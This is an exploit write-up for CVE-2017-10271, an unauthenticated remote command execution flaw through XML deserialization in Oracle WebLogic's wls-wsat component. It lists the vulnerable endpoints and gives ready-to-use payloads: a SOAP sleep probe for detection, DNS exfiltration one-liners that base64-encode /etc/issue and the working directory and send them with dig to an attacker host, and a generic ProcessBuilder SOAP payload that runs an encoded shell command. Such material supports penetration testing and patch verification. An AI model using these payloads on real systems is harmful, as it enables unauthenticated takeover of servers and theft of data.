# [Oracle Weblogic Server] - ['wls-wsat' Component Deserialization Remote Command Execution]

* **Exploit Title:** [Oracle Weblogic Server] - ['wls-wsat' Component Deserialization Remote Command Execution]
* **Vendor Homepage**: https://www.oracle.com/security-alerts/cpuoct2017.html
* **Software Link**: https://www.oracle.com/middleware/weblogic/
* **Version**: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
* **Tested on**: Oracle WebLogic 10.3.6.0.0 running on IBM Red Hat linux 
* **CVE** : CVE-2017-10271

---

## Overview

The Oracle WebLogic Server component of Oracle Fusion Middleware "wls-wsat" (versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, or 12.2.1.2.0) is vulnerable to unsafe deserialization of XML encoded Java objects, leading to remote code execution (RCE), and possibly a full takeover of the web server by any unauthenticated user. Malicious input passed to the "XMLDecoder" constructor and read functions within the "WorkContextXmlInputAdapter" class result in the deserialization of an arbitrary Java serialized object.


## Prerequisites

* 'wls-wsat' component enabled and installed

## Full description

### Vulnerable paths (wls-wsat endpoint list)

* /wls-wsat/CoordinatorPortType
* /wls-wsat/CoordinatorPortType11
* /wls-wsat/ParticipantPortType
* /wls-wsat/ParticipantPortType11
* /wls-wsat/RegistrationPortTypeRPC
* /wls-wsat/RegistrationPortTypeRPC11
* /wls-wsat/RegistrationRequesterPortType
* /wls-wsat/RegistrationRequesterPortType11

### Detecting if the endpoint is vulnerable and handles properly an arbitrary SOAP message

Example using "/wls-wsat/CoordinatorPortType":

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: vulnerableHost
Content-Length: 1226
Content-type: text/xml;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
```

Sleep(ms) detection payload:

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>10000</long>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```


### Encoding payloads to handle special characters

Example of payload - Checking if port 22 is open on the target:
```shell
base64 -w0 << 'EOF'
netstat -ltn | grep -F :22 && ping -c3 <IPAddress>
EOF
```

### Data exfiltration through DNS protocol

Payload 1 - Exfiltrate the system name:
```shell
cat /etc/issue | base64 | xargs -I '{}' dig +time=1 +tries=1 DATA.{} @<IPAddress>
```

Payload 2 - Exfiltrate the name of current working directory:
```shell 
pwd | base64 | xargs -I '{}' dig +time=1 +tries=1 DATA.{} @<IPAddress>
```

### Generic RCE SOAP payload

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>/bin/sh</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>{ echo bmV0c3RhdCAtbHRuIHwgZ3JlcCAtRmkgOjIyICYmIHBpbmcgLWMzIDE5Mi4xNjguMS4xCg== | base64 -d | sh -s; }</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
